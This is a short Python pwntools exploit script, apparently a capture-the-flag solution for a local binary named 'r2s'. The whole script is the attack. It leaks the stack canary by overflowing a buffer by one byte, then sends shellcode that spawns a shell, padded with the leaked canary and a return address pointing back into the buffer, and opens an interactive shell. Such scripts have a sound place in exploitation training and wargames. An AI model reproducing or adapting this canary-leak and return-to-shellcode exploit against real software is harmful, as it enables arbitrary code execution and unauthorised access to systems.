#! /usr/bin/python3 

from pwn import *

def slog(n, m):
    return success(':'.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline()[:-1])
buf2cnry = buf2sfp - 8

slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

payload = b'A' * (buf2cnry +1)
p.sendafter(b'Input:', payload)
p.recvuntil(payload)

cnry = u64(b'\x00' + p.recvn(7))
slog('Addressof canary', cnry)

sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
p.sendlineafter(b'Input:',payload)

p.interactive()
